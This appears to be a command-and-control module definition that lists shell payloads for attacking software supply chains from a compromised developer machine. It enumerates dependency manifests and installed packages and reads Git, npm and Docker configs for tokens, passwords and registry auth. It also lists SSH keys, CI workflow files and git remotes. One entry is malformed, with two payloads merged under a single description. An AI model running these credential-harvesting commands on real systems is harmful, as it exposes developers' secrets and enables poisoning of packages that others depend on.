name: Supply Chain Attack & Dependency Poisoning
description: Modern software supply chain exploitation including dependency confusion, package manager poisoning, CI/CD pipeline injection, and developer tool compromise
author: SecureComm C2 - SupplyChainSec

commands.payload: find /home -name 'package.json' -o -name 'requirements.txt' -o -name 'Cargo.toml' -o -name 'go.mod' -o -name 'pom.xml' -o -name 'Gemfile' 2>/dev/null | head -30; cat package.json 2>/dev/null | jq -r '.dependencies | keys[]' 2>/dev/null | head -20
commands.description: Dependency manifest discovery across multiple ecosystems

commands.payload: pip list 2>/dev/null | head -30; npm list -g --depth=0 2>/dev/null | head -20; gem list 2>/dev/null | head -20; go list -m all 2>/dev/null | head -20; ls -la ~/.m2/repository/ 2>/dev/null | head -10
commands.description: Installed package enumeration for all major package managers

commands.payload: cat ~/.gitconfig 2>/dev/null | grep -E 'user|token|password'; cat ~/.docker/config.json 2>/dev/null | jq -r '.auths | keys[]' 2>/dev/null; ls -la ~/.ssh/ 2>/dev/null; cat ~/.npmrc 2>/dev/null | grep -E '_auth|registry'
commands.description: Developer credential and registry configuration extraction

commands.payload: find / -name '.github' -type d 2>/dev/null | head -10; cat .github/workflows/*.yml 2>/dev/null | head -100 || echo 'No GitHub Actions'; find / -name '.gitlab-ci.yml' 2>/dev/null | head -5

ls -la node_modules/ 2>/dev/null | wc -l; find node_modules -name '*.js' -exec grep -l 'eval|child_process|https' {} \; 2>/dev/null | head -10; pip show requests 2>/dev/null | grep -E 'Location|Version'
commands.description: Dependency tree analysis and suspicious package detection

commands.payload: git log --oneline -20 2>/dev/null; git remote -v 2>/dev/null; cat .git/config 2>/dev/null | grep -E 'url|token'; ls -la .git/hooks/ 2>/dev/null
commands.description: Git repository metadata and hook inspection

demonstration_notes: State-of-the-art supply chain attack vectors targeting modern software development workflows
